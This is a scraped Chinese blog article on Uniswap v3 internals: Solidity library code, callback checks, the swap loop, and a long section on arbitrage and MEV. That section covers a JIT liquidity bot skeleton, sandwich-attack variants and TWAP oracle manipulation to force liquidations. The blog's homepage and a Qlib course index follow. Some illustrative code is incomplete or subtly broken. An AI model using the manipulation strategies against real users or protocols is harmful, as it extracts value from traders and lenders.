}\n}\n位图设计的技术优势：\n\nO(1)查找：在单个word内查找下一个tick的时间复杂度为常数\n空间效率：每个tick只占用1位，极大节省存储空间\n位运算优化：使用位运算实现高效的查找算法\n边界处理：正确处理负数tick和边界情况\n\nBitMath库的高级位运算\nlibrary BitMath {\n    // 查找最高有效位（MSB）\n    function mostSignificantBit(uint256 x) internal pure returns (uint8 r) {\n        require(x &gt; 0);\n \n        if (x &gt;= 0x100000000000000000000000000000000) {\n            x &gt;&gt;= 128;\n            r += 128;\n        }\n        if (x &gt;= 0x10000000000000000) {\n            x &gt;&gt;= 64;\n            r += 64;\n        }\n        if (x &gt;= 0x100000000) {\n            x &gt;&gt;= 32;\n            r += 32;\n        }\n        if (x &gt;= 0x10000) {\n            x &gt;&gt;= 16;\n            r += 16;\n        }\n        if (x &gt;= 0x100) {\n            x &gt;&gt;= 8;\n            r += 8;\n        }\n        if (x &gt;= 0x10) {\n            x &gt;&gt;= 4;\n            r += 4;\n        }\n        if (x &gt;= 0x4) {\n            x &gt;&gt;= 2;\n            r += 2;\n        }\n        if (x &gt;= 0x2) r += 1;\n    }\n \n    // 查找最低有效位（LSB）\n    function leastSignificantBit(uint256 x) internal pure returns (uint8 r) {\n        require(x &gt; 0);\n \n        r = 255;\n        if (x &amp; type(uint128).max &gt; 0) {\n            r -= 128;\n        } else {\n            x &gt;&gt;= 128;\n        }\n        if (x &amp; type(uint64).max &gt; 0) {\n            r -= 64;\n        } else {\n            x &gt;&gt;= 64;\n        }\n        if (x &amp; type(uint32).max &gt; 0) {\n            r -= 32;\n        } else {\n            x &gt;&gt;= 32;\n        }\n        if (x &amp; type(uint16).max &gt; 0) {\n            r -= 16;\n        } else {\n            x &gt;&gt;= 16;\n        }\n        if (x &amp; type(uint8).max &gt; 0) {\n            r -= 8;\n        } else {\n            x &gt;&gt;= 8;\n        }\n        if (x &amp; 0xf &gt; 0) {\n            r -= 4;\n        } else {\n            x &gt;&gt;= 4;\n        }\n        if (x &amp; 0x3 &gt; 0) {\n            r -= 2;\n        } else {\n            x &gt;&gt;= 2;\n        }\n        if (x &amp; 0x1 &gt; 0) r -= 1;\n    }\n}\n预言机系统的完整实现\n观察者数组的管理\nlibrary Oracle {\n    struct Observation {\n        uint32 blockTimestamp;                        // 区块时间戳\n        int56 tickCumulative;                        // tick累积值\n        uint160 secondsPerLiquidityCumulativeX128;   // 每流动性秒数累积值\n        bool initialized;                            // 是否已初始化\n    }\n \n    // 初始化观察者数组\n    function initialize(Observation[65535] storage self, uint32 time)\n        internal\n        returns (uint16 cardinality, uint16 cardinalityNext)\n    {\n        self[0] = Observation({\n            blockTimestamp: time,\n            tickCumulative: 0,\n            secondsPerLiquidityCumulativeX128: 0,\n            initialized: true\n        });\n        return (1, 1);\n    }\n \n    // 写入新的观察值\n    function write(\n        Observation[65535] storage self,\n        uint16 index,\n        uint32 blockTimestamp,\n        int24 tick,\n        uint128 liquidity,\n        uint16 cardinality,\n        uint16 cardinalityNext\n    ) internal returns (uint16 indexUpdated, uint16 cardinalityUpdated) {\n        Observation memory last = self[index];\n \n        // 防止同一区块内重复写入\n        if (last.blockTimestamp == blockTimestamp) return (index, cardinality);\n \n        // 扩容检查\n        if (cardinalityNext &gt; cardinality &amp;&amp; index == (cardinality - 1)) {\n            cardinalityUpdated = cardinalityNext;\n        } else {\n            cardinalityUpdated = cardinality;\n        }\n \n        indexUpdated = (index + 1) % cardinalityUpdated;\n        self[indexUpdated] = transform(last, blockTimestamp, tick, liquidity);\n    }\n \n    // 扩展观察者数组容量\n    function grow(\n        Observation[65535] storage self,\n        uint16 current,\n        uint16 next\n    ) internal returns (uint16) {\n        require(current &gt; 0, &#039;I&#039;);\n        if (next &lt;= current) return current;\n        \n        // 预初始化新槽位以节省gas\n        for (uint16 i = current; i &lt; next; i++) self[i].blockTimestamp = 1;\n        return next;\n    }\n \n    // 二分查找历史观察值\n    function binarySearch(\n        Observation[65535] storage self,\n        uint32 time,\n        uint32 target,\n        uint16 index,\n        uint16 cardinality\n    ) private view returns (Observation memory beforeOrAt, Observation memory atOrAfter) {\n        uint256 l = (index + 1) % cardinality; // 最老的观察值\n        uint256 r = l + cardinality - 1;       // 最新的观察值\n        uint256 i;\n        \n        while (true) {\n            i = (l + r) / 2;\n            beforeOrAt = self[i % cardinality];\n \n            if (!beforeOrAt.initialized) {\n                l = i + 1;\n                continue;\n            }\n \n            atOrAfter = self[(i + 1) % cardinality];\n            bool targetAtOrAfter = lte(time, beforeOrAt.blockTimestamp, target);\n \n            if (targetAtOrAfter &amp;&amp; lte(time, target, atOrAfter.blockTimestamp)) break;\n \n            if (!targetAtOrAfter) r = i - 1;\n            else l = i + 1;\n        }\n    }\n}\n回调机制的安全实现\n交换回调的验证机制\ninterface IUniswapV3SwapCallback {\n    function uniswapV3SwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata data\n    ) external;\n}\n \n// 在交换函数中的使用\nif (zeroForOne) {\n    if (amount1 &lt; 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n    \n    uint256 balance0Before = balance0();\n    IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n    require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#039;IIA&#039;);\n} else {\n    if (amount0 &lt; 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n    \n    uint256 balance1Before = balance1();\n    IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n    require(balance1Before.add(uint256(amount1)) &lt;= balance1(), &#039;IIA&#039;);\n}\n回调机制的安全设计：\n\n余额验证：通过前后余额对比确保代币已正确转入\n重入保护：在回调执行前设置重入锁\n数量检查：验证实际转入数量不少于计算数量\n失败回滚：任何验证失败都会回滚整个交易\n\n铸造回调的实现\ninterface IUniswapV3MintCallback {\n    function uniswapV3MintCallback(\n        uint256 amount0Owed,\n        uint256 amount1Owed,\n        bytes calldata data\n    ) external;\n}\n \n// 铸造函数中的使用\nfunction mint(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount,\n    bytes calldata data\n) external override lock returns (uint256 amount0, uint256 amount1) {\n    require(amount &gt; 0);\n    \n    (, int256 amount0Int, int256 amount1Int) = _modifyPosition(\n        ModifyPositionParams({\n            owner: recipient,\n            tickLower: tickLower,\n            tickUpper: tickUpper,\n            liquidityDelta: int256(amount).toInt128()\n        })\n    );\n \n    amount0 = uint256(amount0Int);\n    amount1 = uint256(amount1Int);\n \n    uint256 balance0Before;\n    uint256 balance1Before;\n    if (amount0 &gt; 0) balance0Before = balance0();\n    if (amount1 &gt; 0) balance1Before = balance1();\n    \n    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);\n    \n    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), &#039;M0&#039;);\n    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), &#039;M1&#039;);\n \n    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n}\n价格发现与交换机制\n价格发现的动态过程\n跨tick交换的价格更新\n在Uniswap v3中，价格发现是一个动态过程，涉及多个tick的跨越：\n// 交换过程中的价格更新逻辑\nwhile (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) {\n    StepComputations memory step;\n    step.sqrtPriceStartX96 = state.sqrtPriceX96;\n \n    // 查找下一个价格边界\n    (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n        state.tick,\n        tickSpacing,\n        zeroForOne\n    );\n \n    // 计算在当前流动性下的交换结果\n    (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n        state.sqrtPriceX96,\n        step.sqrtPriceNextX96,\n        state.liquidity,\n        state.amountSpecifiedRemaining,\n        fee\n    );\n \n    // 如果跨越了tick边界，更新流动性\n    if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n        if (step.initialized) {\n            int128 liquidityNet = ticks.cross(...);\n            if (zeroForOne) liquidityNet = -liquidityNet;\n            state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n        }\n        state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n    }\n}\n价格发现的特点：\n\n分段线性：在每个流动性区间内，价格变化是连续的\n流动性跳跃：跨越tick时流动性可能发生突变\n实时更新：每笔交易都会更新当前价格\n边界效应：价格不能无限变化，受到流动性分布限制\n\n滑点控制机制\n// 滑点保护的实现\nfunction exactInputSingle(ExactInputSingleParams calldata params)\n    external\n    payable\n    override\n    checkDeadline(params.deadline)\n    returns (uint256 amountOut)\n{\n    amountOut = exactInputInternal(\n        params.amountIn,\n        params.recipient,\n        params.sqrtPriceLimitX96,\n        SwapCallbackData({\n            path: abi.encodePacked(params.tokenIn, params.fee, params.tokenOut),\n            payer: msg.sender\n        })\n    );\n    require(amountOut &gt;= params.amountOutMinimum, &#039;Too little received&#039;);\n}\n \n// 价格限制的验证\nrequire(\n    zeroForOne\n        ? sqrtPriceLimitX96 &lt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &gt; TickMath.MIN_SQRT_RATIO\n        : sqrtPriceLimitX96 &gt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &lt; TickMath.MAX_SQRT_RATIO,\n    &#039;SPL&#039;\n);\n流动性聚合的经济影响\n资本效率的量化分析\n集中流动性带来的资本效率提升可以量化计算：\n传统AMM的资本利用率：\n对于价格在[0.9P, 1.1P]区间90%交易的情况\n实际利用的流动性 ≈ 0.1% * 总流动性\n\n集中流动性的资本利用率：\n将所有流动性集中在[0.9P, 1.1P]区间\n实际利用的流动性 = 100% * 区间流动性\n\n效率提升 = 100% / 0.1% = 1000倍\n\n无常损失的新模式\n集中流动性改变了无常损失的计算模式：\n// 传统AMM的无常损失计算\nfunction calculateImpermanentLoss(uint256 priceRatio) public pure returns (uint256) {\n    // IL = 2 * sqrt(price_ratio) / (1 + price_ratio) - 1\n    uint256 sqrtRatio = FixedPointMathLib.sqrt(priceRatio);\n    return (2 * sqrtRatio) / (FixedPointMathLib.WAD + priceRatio) - FixedPointMathLib.WAD;\n}\n \n// 集中流动性的情况更复杂，需要考虑价格区间\nfunction calculateConcentratedIL(\n    uint256 currentPrice,\n    uint256 lowerPrice,\n    uint256 upperPrice,\n    uint256 initialPrice\n) public pure returns (uint256) {\n    if (currentPrice &lt; lowerPrice || currentPrice &gt; upperPrice) {\n        // 价格超出区间，转换为单一资产\n        return type(uint256).max; // 表示极大损失\n    }\n    \n    // 在区间内的损失计算更加复杂\n    // 需要考虑虚拟储备的影响\n}\n费用优化策略\n动态费率的影响\n不同费率等级对交易者和LP的影响：\n// 费率对价格影响的计算\nfunction calculatePriceImpact(\n    uint128 liquidity,\n    uint256 amountIn,\n    uint24 feePips\n) public pure returns (uint256 priceImpact, uint256 effectivePrice) {\n    // 考虑费用后的实际输入\n    uint256 amountInLessFee = (amountIn * (1e6 - feePips)) / 1e6;\n    \n    // 计算价格影响\n    priceImpact = amountInLessFee / liquidity;\n    \n    // 计算有效价格（包含费用）\n    effectivePrice = amountIn / (amountIn - (amountIn * feePips / 1e6));\n}\n费用套利的机会\n不同池子间的费率差异创造了套利机会：\ncontract FeeArbitrage {\n    function arbitrageFees(\n        address poolLow,   // 低费率池\n        address poolHigh,  // 高费率池\n        uint256 amount\n    ) external {\n        // 1. 在低费率池买入\n        // 2. 在高费率池卖出\n        // 3. 捕获费率差异\n        \n        // 这种套利有助于价格收敛\n    }\n}\n套利策略与MEV深度分析\n套利策略与MEV深度分析\nUniswap v3的集中流动性机制不仅极大地提升了资本效率，也催生了更为复杂和精密的套利策略及MEV（最大可提取价值）机会。\n传统套利策略在v3中的演进\n跨池套利 (Cross-Pool Arbitrage)\n在Uniswap v3中，同一代币对可以存在于多个不同费率的池子中。这种设计自然地创造了套利机会。\n策略原理：\n当两个不同费率的池子（例如，USDC/ETH的0.05%池和0.3%池）因交易流不平衡而产生价格差异时，套利者可以：\n\n在价格较低的池子买入。\n在价格较高的池子卖出。\n赚取差价，直到两个池子的价格（扣除费用后）趋于一致。\n\n实现考量：\ncontract CrossPoolArbitrage {\n    \n    // 假设通过flash swap借入资产\n    function executeArbitrage(\n        address tokenIn,\n        address tokenOut,\n        uint24 feeLow,\n        uint24 feeHigh,\n        uint256 amountToBorrow\n    ) external {\n        IUniswapV3Pool poolLow = IUniswapV3Pool(getPool(tokenIn, tokenOut, feeLow));\n        \n        // 使用Flash Swap借入tokenIn\n        poolLow.swap(\n            address(this), // recipient\n            false, // zeroForOne, 假设tokenIn是token1\n            int256(amountToBorrow), // amountSpecified, 借入\n            0, // sqrtPriceLimitX96, 不关心\n            abi.encode(tokenIn, tokenOut, feeHigh) // 编码回调数据\n        );\n    }\n \n    function uniswapV3SwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata _data\n    ) external override {\n        // 解码回调数据\n        (address tokenIn, address tokenOut, uint24 feeHigh) = \n            abi.decode(_data, (address, address, uint24));\n \n        uint256 amountReceived = uint256(-amount1Delta); // 实际收到的tokenOut\n \n        // 在高费率池子进行反向交易\n        IUniswapV3Pool poolHigh = IUniswapV3Pool(getPool(tokenIn, tokenOut, feeHigh));\n        \n        // 批准高费率池子使用tokenOut\n        IERC20(tokenOut).approve(address(poolHigh), amountReceived);\n \n        // 卖出tokenOut换回tokenIn\n        poolHigh.swap(\n            address(this), // recipient\n            true, // zeroForOne\n            int256(amountReceived), // amountSpecified, 卖出全部收到的\n            // 设置一个合理的价格限制来防止被三明治攻击\n            getSqrtPriceLimitX96(...),\n            &quot;&quot; // no callback data needed here\n        );\n        \n        // 偿还Flash Swap\n        uint256 amountToRepay = calculateRepayAmount(amount0Delta);\n        IERC20(tokenIn).transfer(msg.sender, amountToRepay);\n \n        // 将利润发送给套利者\n        uint256 profit = IERC20(tokenIn).balanceOf(address(this));\n        if (profit &gt; 0) {\n            IERC20(tokenIn).transfer(owner, profit);\n        }\n    }\n}\n关键挑战：\n\nGas成本：交易必须足够大以覆盖gas费用。\n滑点：必须精确计算两个池子的滑点。\n原子性：交易必须在单个原子交易中完成，Flash Swap是理想工具。\n\n跨交易所套利 (Cross-Exchange Arbitrage)\n这是最常见的套利形式，利用Uniswap v3与中心化交易所（CEX）或其他DEX之间的价格差异。\n策略原理：\n\n监控Uniswap v3池子价格与CEX（如Binance, Coinbase）价格。\n当 Price_CEX &gt; Price_UniV3 + GasFee 时，在Uniswap买入，在CEX卖出。\n当 Price_UniV3 &gt; Price_CEX + GasFee 时，在CEX买入，在Uniswap卖出。\n\n实现考量：\n\n延迟：CEX的API延迟和区块链的确认时间是主要障碍。\n资金管理：需要在CEX和链上钱包中都持有资金。\n执行风险：链上交易可能因价格变动而失败，而CEX的订单可能无法立即成交。\n\nUniswap v3 特有的套利机会\nJust-in-Time (JIT) 流动性套利\n这是v3独有的一种高级MEV策略，通常被认为是”寄生性”的。\n策略原理：\n\nMEV机器人（Searcher）在内存池（Mempool）中发现一笔大额交易（受害者交易）。\n在受害者交易被打包进区块之前的同一区块中，JIT套利者执行以下操作：\na. 添加流动性：在大额交易即将经过的价格区间内，提供大量的集中流动性。\nb. 等待交易：受害者的交易执行，支付了大量的交易费用给这个临时提供的流动性。\nc. 移除流动性：在受害者交易执行之后的同一区块中，立即移除之前添加的流动性，并收取累积的费用。\n\n为什么这能成功？\n\n原子性：所有操作（添加流动性、受害者交易、移除流动性）都在同一个原子性的区块中完成。\n交易排序：MEV矿工或构建者（Builder）可以精确控制一个区块内的交易顺序。\n\n实现考量：\ncontract JITLiquidityBot {\n    \n    // 这个函数由MEV中继器（如Flashbots）在交易前调用\n    function provideAndRemoveLiquidity(\n        address victim, // 只是一个标识，实际从mempool监控\n        address pool,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 liquidityAmount\n    ) external {\n        // 1. 从金库获取资金或使用Flash Loan\n        uint256 amount0Required;\n        uint256 amount1Required;\n        \n        // 2. 计算提供流动性所需的代币数量\n        (amount0Required, amount1Required) = \n            IUniswapV3LiquidityManager(manager).getAmountsForLiquidity(...);\n \n        // 3. 添加流动性\n        IUniswapV3Pool(pool).mint(address(this), tickLower, tickUpper, liquidityAmount, &quot;&quot;);\n \n        // ****\n        // * 在这里，MEV构建者会插入受害者的swap交易 *\n        // ****\n        \n        // 4. 移除流动性\n        IUniswapV3Pool(pool).burn(tickLower, tickUpper, liquidityAmount);\n        \n        // 5. 收取费用\n        IUniswapV3Pool(pool).collect(address(this), tickLower, tickUpper, type(uint128).max, type(uint128).max);\n        \n        // 6. 偿还Flash Loan（如果使用）并发送利润\n    }\n}\n经济影响：\n\n对交易者：没有直接损失，费用本应支付给其他LP。\n对普通LP：损失了本应获得的交易费用。\n对协议：有争议，但增加了特定交易的流动性深度，可能减少了滑点。\n\nTick 边界套利 (Tick Boundary Arbitrage)\n当价格接近一个有大量流动性的tick时，会产生独特的套利机会。\n策略原理：\n\n监控池子状态，找到一个即将被跨越且流动性变化巨大的tick（liquidityNet很大）。\n计算将价格推过这个tick所需的交易量。\n比较推动价格前后的市场价格差异与推动成本。\n如果有利可图，执行一笔小交易将价格推过tick，然后在其他市场（或本池反向交易）进行套利。\n\n示例场景：\n\n一个tick T 上有大量的卖出流动性。\n当前价格略低于 T。\n套利者进行一笔小额买入，将价格推高到 T 之上。\n大量流动性瞬间变为活跃状态，导致价格被”压制”，可能低于套利者买入的平均价格。\n套利者可以立即卖出，实现盈利。\n\n关键挑战：\n\n需要精确的链上状态数据和模拟能力。\n必须在其他套利者之前发现并执行。\n\n范围订单套利 (Range Order Arbitrage)\nLP可以将流动性集中在一个极窄的范围内，模拟传统金融中的限价单（Limit Order）。\n策略原理：\n\n创建范围订单：LP在价格 P 的紧邻上方（如 [P, P + ε]）提供单一资产（如USDC）的流动性。当价格从下向上穿越这个区间时，USDC会被卖出换成ETH，相当于一个ETH的卖出限价单。\n套利者监控：套利者监控这些”链上限价单”。\n执行套利：当其他交易所的ETH价格上涨，超过了这个范围订单的价格时，套利者可以执行交易，买入这个范围订单提供的”便宜”ETH，然后在其他交易所卖出获利。\n\n实现考行：\n\n需要一个高效的链上数据索引器来监控所有池子的Position创建事件。\n必须能够快速比较不同市场的价格，并计算执行成本。\n\nMEV(最大可提取价值)深度分析\n三明治攻击的新变种\nUniswap v3的 sqrtPriceLimitX96 参数为防范传统的三明治攻击提供了一定保护。但攻击者也随之进化。\n传统三明治攻击：\n\nFront-run: 在受害者交易前买入。\nVictim’s tx: 受害者交易推高价格。\nBack-run: 在受害者交易后卖出。\n\nv3中的变种攻击：\n\nJIT三明治：攻击者不是自己买卖，而是在受害者交易前后进行JIT流动性攻击，赚取其费用。这种攻击更隐蔽，因为受害者的滑点可能更低，但其交易费用被攫取。\n组合攻击：攻击者可以在front-run交易中买入，然后在back-run交易中不仅卖出，还同时移除自己在此价格范围内的流动性。\n\nOracle 操纵 MEV\nUniswap v3的TWAP（时间加权平均价格）预言机对瞬时价格操纵有很强的抵抗力，但并非无法攻击。\n攻击场景：\n\n一个借贷协议使用Uniswap v3的TWAP作为价格来源来决定清算阈值。\n预言机的时间窗口为30分钟。\n攻击者拥有大量资金，可以在30分钟内持续将池子价格压低（或推高）到一个非市场水平。\n这需要攻击者承担一定的损失来维持这个价格。\n当TWAP价格更新后，攻击者可以在借贷协议中触发大量不当清算，其清算收益远大于维持价格的成本。\n\n防御机制：\n\n增加时间窗口：更长的时间窗口（如1小时或更长）会指数级增加攻击成本。\n多预言机来源：结合Chainlink等其他预言机进行交叉验证。\n\nGas 竞拍与私有交易池 (Flashbots)\n在MEV的世界里，公开的Gas价格竞拍效率低下且会导致网络拥堵。Flashbots等服务应运而生。\n运作模式：\n\nSearchers（搜索者）：监控链上活动，发现MEV机会，并创建”交易捆绑包”（bundle）。一个捆绑包通常包含攻击者的交易和受害者的交易，并按特定顺序排列。\nBuilders（构建者）：从多个搜索者那里接收捆绑包，并将它们组合成一个最优的、最有利可图的区块。\nRelays（中继器）：验证区块并将其发送给矿工/验证者。\nValidators（验证者）：将这个区块上链，并获得搜索者支付的”小费”。\n\n对套利的影响：\n\n无风险执行：搜索者可以设置交易捆绑包，只有在盈利的情况下才执行，否则整个捆绑包将失败，无需支付gas。\n隐私性：交易在被上链前不会在公共内存池中广播，避免了被他人抢先交易。\n竞争加剧：MEV竞争从”谁的gas费高”转变为”谁的策略更优、给验证者的小费更高”。\n\n套利与MEV机器人的实现考量\n构建一个成功的套利或MEV机器人是一个复杂的系统工程。\n架构设计\n一个典型的机器人架构包括：\n\n监控模块（Monitor）：通过WebSocket连接到以太坊节点，实时监听新区块、待处理交易（Mempool）和事件日志。\n策略模块（Strategy）：分析监控到的数据，识别潜在的套利或MEV机会。\n模拟模块（Simulator）：使用主网分叉（Forking Mainnet）环境（如Hardhat, Anvil）对机会进行快速模拟，验证其盈利能力和成功率。\n执行模块（Executor）：构建并签署交易，通过Flashbots等私有中继器发送，或直接发送到公共内存池。\n\n性能优化\n\n节点延迟：使用地理位置近、配置高的私有节点，而不是公共RPC服务。\n代码效率：核心的链上合约逻辑使用Yul或汇编语言编写，以最大程度减少gas消耗和执行时间。\n并发处理：能够同时监控和模拟多个机会。\n\n风险管理\n\n盈利能力检查：require(profit &gt; MINIMUM_PROFIT, &quot;Not profitable&quot;);\n滑点保护：在合约和交易参数中设置严格的滑点限制。\n交易回滚分析：记录并分析失败的交易，找出原因并改进策略。\n资金安全：执行合约中的资金量应受严格控制，大部分资金存放在冷钱包或多签钱包中。\n\n实战案例与最佳实践\n作为LP的最佳实践\n\n主动管理：v3 LP需要主动管理其头寸，根据市场变化调整价格范围。\n范围选择：\n\n稳定币对：选择极窄的范围（如 [0.999, 1.001]）以最大化费用收益。\n趋势市场：将范围设置在预期的价格方向上。\n震荡市场：选择一个较宽的范围来持续赚取费用。\n\n\n再投资：定期收取费用并将其重新投资，以实现复利效应。\n使用工具：利用如Revert Finance, Gamma, Arrakis等流动性管理协议来自动化管理过程。\n\n作为交易者的最佳实践\n\n使用聚合器：1inch, Matcha等DEX聚合器会自动寻找最优的交易路径，可能涉及跨多个v3池子或v2池子的分割路由。\n设置滑点保护：始终设置合理的滑点限制（sqrtPriceLimitX96），特别是在交易流动性较差的代币时。\n关注费用等级：对于同一代币对，优先选择费用最低且流动性充足的池子进行交易。\n"},"index":{"slug":"index","filePath":"index.md","title":"欢迎","links":["quant/qlib/week1/","quant/qlib/week2/","quant/qlib/week3/","quant/qlib/week5/","blockchainguide/Public_Chain_Development/","blockchainguide/DApp_Development/","blockchainguide/Layer2_Solutions/","blockchainguide/Cross_Chain_Technology/","blockchainguide/Privacy_Computing/","blockchainguide/Decentralized_Storage/","blockchainguide/Blockchain_Basics/","blockchainguide/Learning_Roadmaps_And_Resources/","quant/qlib/week5/01_基础理论系列/","quant/qlib/week5/02_PyTorch框架系列/","quant/qlib/week5/03_LSTM模型构建系列/","quant/qlib/week5/04_时序数据处理系列/","quant/qlib/week5/05_模型训练优化系列/","quant/qlib/week5/06_实战应用系列/","quant/qlib/","blockchainguide/"],"tags":[],"content":"欢迎来到我的技术博客\n\n探索技术、分享知识、记录成长\n\n\n👋 关于我\n我是一名热爱技术的开发者，专注于以下领域：\n\n量化投资：使用机器学习和深度学习进行量化分析和交易策略研究\n区块链技术：智能合约开发、去中心化应用（DApp）构建\n深度学习：PyTorch、TensorFlow等框架的实践与应用\n\n\n📚 博客内容\n量化投资\n探索量化世界的奥秘，从特征工程到深度学习模型应用。\n\n  \n    \n      📊 特征工程\n      Qlib特征工程的系统讲解\n      进入模块 →\n    \n    \n      ⚡ LightGBM\n      机器学习在量化中的应用\n      进入模块 →\n    \n    \n      📊 回测引擎\n      策略回测与绩效评估\n      进入模块 →\n    \n     \n       🧠 LSTM深度学习\n       时序数据的深度学习方法\n       进入模块 →\n     \n   \n \nQlib 学习路径\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n周主题文档状态Week 1特征工程查看文档✅ 完成Week 2LightGBM查看文档✅ 完成Week 3回测系统查看文档✅ 完成Week 4强化学习敬请期待🚧 计划中Week 5LSTM深度学习查看文档✅ 完成\n\n区块链技术\n探索区块链世界，从智能合约到DeFi应用，从公链开发到Layer2解决方案。\n\n  \n    \n      🔗 公链开发\n      以太坊、Cosmos、Fabric等\n      进入模块 →\n    \n    \n      💻 DApp开发\n      智能合约、安全审计、DeFi\n      进入模块 →\n    \n    \n      ⚡ Layer2\n      Optimism、Arbitrum、zkRollup\n      进入模块 →\n    \n    \n      🌐 跨链技术\n      IBC、跨链桥、HTLC\n      进入模块 →\n    \n    \n      🔒 隐私计算\n      零知识证明、安全多方计算\n      进入模块 →\n    \n    \n      💾 去中心化存储\n      IPFS、FileCoin\n      进入模块 →\n    \n  \n\n区块链学习路径\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模块主题文档状态区块链基础查看文档✅ 完成公链开发查看文档✅ 完成DApp开发查看文档✅ 完成Layer2技术查看文档✅ 完成跨链技术查看文档✅ 完成隐私计算查看文档✅ 完成学习路线查看文档✅ 完成\n\n🔥 最新更新\nWeek 5 - LSTM深度学习模型 ✨\n深入学习LSTM神经网络，掌握时序数据的深度学习方法。\n\n  \n    \n      📚 基础理论\n      RNN与LSTM原理\n      查看 →\n    \n    \n      🔧 PyTorch框架\n      Tensor与模型构建\n      查看 →\n    \n    \n      🏗️ 模型构建\n      架构与实现\n      查看 →\n    \n    \n      💾 数据处理\n      预处理与Dataset\n      查看 →\n    \n    \n      ⚙️ 训练优化\n      训练与优化策略\n      查看 →\n    \n    \n      🎯 实战应用\n      案例与最佳实践\n      查看 →\n    \n  \n\n\n🛠️ 技术栈\n量化投资\n\n  Python\n  Qlib\n  PyTorch\n  LightGBM\n  Pandas\n  NumPy\n\n区块链\n\n  Solidity\n  Ethers.js\n  Hardhat\n  Web3.js\n  React\n\n\n📖 推荐资源\n📚 书籍\n量化投资\n\n《量化投资：策略与技术》\n《Python金融大数据分析》\n《统计套利》\n\n深度学习\n\n《深度学习》（Ian Goodfellow）\n《动手学深度学习》\n《Python深度学习》（François Chollet）\n\n区块链\n\n《精通比特币》\n《以太坊技术详解与实战》\n《智能合约开发实战》\n\n🎓 在线课程\n\nCoursera: Deep Learning Specialization\nFast.ai: Practical Deep Learning for Coders\nedX: Blockchain Basics\n\n\n📝 写作计划\n2025年计划\n量化投资\n\n Week 1 - 特征工程\n Week 2 - LightGBM模型\n Week 3 - 回测系统\n Week 4 - 强化学习\n Week 5 - LSTM深度学习\n Week 6 - Transformer模型\n 高级回测技巧\n 多因子模型\n\n区块链\n\n 区块链基础\n 智能合约开发\n 公链开发研究\n DeFi项目实战\n Layer2技术\n 跨链技术\n 隐私计算\n\n\n🤝 交流与合作\n欢迎与我交流技术问题、分享学习心得！\n\n📧 Email: [待添加]\n🐦 Twitter: [待添加]\n💻 GitHub: [待添加]\n💬 微信: [待添加]\n\n\n\n  💡 开始学习\n  从量化投资到区块链，探索技术的无限可能\n  \n    量化学习\n    区块链\n  \n\n\n\n  持续更新中，欢迎收藏和分享！\n  Made with ❤️ by [你的名字]\n"},"quant/qlib/index":{"slug":"quant/qlib/index","filePath":"quant/qlib/index.md","title":"index","links":["week1/01-qlib特征工程全景概览","week1/02-horizon对齐详解","week1/03-横截面标准化与中性化","week1/04-相对强弱预测的量化思维","week1/05-qlib特征工程实践指南","week2/01-Gradient-Boosting原理","week2/02-时序数据划分","week2/03-模型训练","week2/04-IC-Rank-IC评估指标","week2/05-特征重要性分析","week2/06-学习检查清单","week3/01-交易策略理论","week3/02-投资组合构建方法","week3/03-Executor与成本模型","week3/04-绩效评估指标","week3/05-实验分析方法","week3/06-回测流程与实践","week3/07-学习检查清单","week5/01_基础理论系列/","week5/02_PyTorch框架系列/","week5/03_LSTM模型构建系列/","week5/04_时序数据处理系列/","week5/05_模型训练优化系列/","week5/06_实战应用系列/","week1/"],"tags":[],"content":"Qlib 量化投资学习路径\n\n系统学习量化投资，从特征工程到深度学习模型\n\n\n📚 学习概览\n本模块提供系统化的Qlib量化投资学习路径，涵盖从基础特征工程到高级深度学习模型的完整知识体系。\n\n🎯 学习路径\n推荐学习顺序\nWeek 1: 特征工程基础\n    ↓\nWeek 2: LightGBM模型\n    ↓\nWeek 3: 回测系统\n    ↓\nWeek 5: LSTM深度学习\n\n\n📖 课程内容\nWeek 1 - 特征工程 📊\n系统讲解Qlib特征工程的核心概念与实践方法。\n文档列表:\n\n01-qlib特征工程全景概览\n02-horizon对齐详解\n03-横截面标准化与中性化\n04-相对强弱预测的量化思维\n05-qlib特征工程实践指南\n\n学习目标:\n\n✅ 理解Qlib特征工程的核心概念\n✅ 掌握horizon对齐方法\n✅ 学会横截面标准化与中性化\n✅ 培养相对强弱预测的量化思维\n✅ 能够独立完成特征工程实践\n\n预计时间: 5-6小时（4-5天）\n\nWeek 2 - LightGBM ⚡\n深入学习LightGBM在量化投资中的应用。\n文档列表:\n\n01-Gradient Boosting原理 - GOSS、EFB、Leaf-wise三大创新\n02-时序数据划分 - 因果性约束、交叉验证、滚动窗口\n03-模型训练 - IC优化、在线学习、分布式训练\n04-IC-Rank-IC评估指标 - 统计检验、时序分析、IR指标\n05-特征重要性分析 - Permutation、SHAP、稳定性分析\n06-学习检查清单 - 